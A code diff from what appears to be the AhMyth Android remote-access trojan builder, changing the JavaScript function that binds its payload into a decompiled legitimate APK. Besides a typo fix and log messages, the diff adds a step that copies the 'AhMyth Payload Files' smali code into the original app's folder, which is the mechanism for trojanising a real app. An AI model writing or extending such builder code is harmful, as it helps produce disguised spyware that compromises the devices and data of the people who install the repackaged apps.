@@ -95,9 +95,11 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 };
 ```
 ```js
+console.log("Reading the Decompiled APK folder...");
+console.log();
 fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
     if (error) {
-        console.log('Reding the Decompiled APK Failed!')
+        console.log('Reading the Decompiled APK Failed!')
         console.log();
         return;
         
@@ -125,7 +127,7 @@ fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
                     if (error) {
                         console.log('Copying Failed!');
                         console.log();
-                		return; 
+                        return;
                     };
                     
                 });
@@ -144,6 +146,17 @@ fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
                     console.log();
                     return;
                 };
+                
+                console.log("Copying AhMyth Payload Files to Original App...");
+                console.log();
+                fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => { 
+                    if (error) {
+                        console.log('Copying Failed!');
+                        console.log();
+                        return;
+                    };
+                    
+                });
 
             });
 
